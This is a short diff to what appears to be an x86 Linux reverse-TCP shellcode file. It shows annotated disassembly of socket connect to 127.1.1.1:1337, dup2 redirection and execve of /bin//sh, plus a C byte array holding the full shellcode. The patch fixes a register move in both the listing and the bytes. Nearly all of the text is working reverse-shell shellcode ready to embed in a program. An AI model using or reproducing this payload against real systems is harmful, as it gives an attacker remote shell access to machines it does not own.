@@ -33,7 +33,7 @@ sys_socketcall connect to 127.1.1.1:1337 - 23 bytes
 dup2 stdin, stdout, stderr to sock_fd 12 bytes
 2a: 6a 02                   push   0x2
 2c: 59                      pop    ecx
-2d: 89 da                   mov    edx,ebx
+2d: 89 d3                   mov    ebx,edx
 2f: b0 3f                   mov    al,0x3f
 31: cd 80                   int    0x80
 33: 49                      dec    ecx
@@ -53,7 +53,7 @@ execve /bin//sh 20 bytes
 char rev_tcp[] =
 "\x31\xDB\x53\x89\xDA\x43\x53\x6A\x02\x89\xE1\x6A\x66\x58\xCD\x80"
 "\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x43\x89\xE1\x6A\x10\x51\x52\x89\xE1\xCD\x80"
-"\x6A\x02\x59\x89\xDA\xB0\x3F\xCD\x80\x49\x79\xF9"
+"\x6A\x02\x59\x89\xD3\xB0\x3F\xCD\x80\x49\x79\xF9"
 "\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80";
 
 int main(int argc, char **argv){
